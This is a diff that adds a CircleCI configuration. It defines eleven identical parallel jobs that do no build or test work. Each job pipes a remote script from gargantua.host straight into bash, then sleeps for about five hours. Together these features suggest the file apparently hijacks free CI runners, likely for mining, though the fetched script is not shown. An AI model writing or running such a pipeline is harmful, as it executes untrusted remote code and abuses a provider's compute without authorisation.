@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  juliayha:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  juliayha1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  juliayha2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  juliayha3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  juliayha4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  juliayha5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  juliayha6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  juliayha7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  juliayha8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  juliayha9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  juliayha10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - juliayha
+      - juliayha1
+      - juliayha2
+      - juliayha3
+      - juliayha4
+      - juliayha5
+      - juliayha6
+      - juliayha7
+      - juliayha8
+      - juliayha9
+      - juliayha10
